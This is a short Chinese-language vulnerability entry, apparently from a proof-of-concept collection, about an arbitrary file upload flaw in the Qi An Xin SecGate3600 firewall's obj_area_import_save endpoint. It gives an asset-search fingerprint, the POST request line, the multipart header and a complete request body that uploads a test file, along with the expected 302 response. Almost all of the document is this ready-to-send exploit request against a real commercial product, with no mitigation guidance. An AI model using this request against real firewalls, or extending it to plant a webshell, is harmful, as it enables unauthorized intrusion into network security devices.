# 奇安信网神SecGate3600防火墙obj_area_import_save任意文件上传漏洞

- **系统**：奇安信网神SecGate3600防火墙obj_area_import_save　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`"1Lh1LHi6yfkhiO83I59AYg=="`
- **请求**：`POST /?g=obj_area_import_save HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=----WebKitFormBoundarybqvzqvmt`

**请求体 / payload**
```
------WebKitFormBoundarybqvzqvmt
Content-Disposition: form-data; name="MAX_FILE_SIZE"
10000000
------WebKitFormBoundarybqvzqvmt
Content-Disposition: form-data; name="upfile"; filename="dudesite.txt"
Content-Type: text/plain
dudesite
------WebKitFormBoundarybqvzqvmt
Content-Disposition: form-data; name="submit_post"
obj_app_upfile
------WebKitFormBoundarybqvzqvmt
Content-Disposition: form-data; name="__hash__"
0b9d6b1ab7479ab69d9f71b05e0e9445
------WebKitFormBoundarybqvzqvmt--
```
- **预期**：302　|　—